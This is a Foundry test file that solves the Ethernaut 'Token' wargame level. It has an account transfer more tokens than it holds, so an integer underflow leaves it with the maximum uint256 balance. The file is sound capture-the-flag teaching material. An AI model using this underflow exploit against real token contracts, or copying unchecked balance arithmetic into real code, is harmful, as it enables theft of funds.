// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

import "forge-std-v1.5.0/Test.sol";
import "src/openzeppelin-ethernaut/Token.sol";

// exploit overflow
contract TokenTest is Test {
    Token instance;
    address alice;

    function setUp() public {
        instance = new Token(100);

        alice = makeAddr("alice");
        instance.transfer(alice, 20);
    }

    function test() public {
        assertEq(instance.balanceOf(alice), 20);

        address bob = makeAddr("bob");
        vm.prank(alice);
        instance.transfer(bob, 21);

        // 20 - 21 + 2^256 = 2^256 - 1 = type(uint256).max
        assertEq(instance.balanceOf(alice), type(uint256).max);
        assertEq(instance.balanceOf(bob), uint256(21));
    }
}
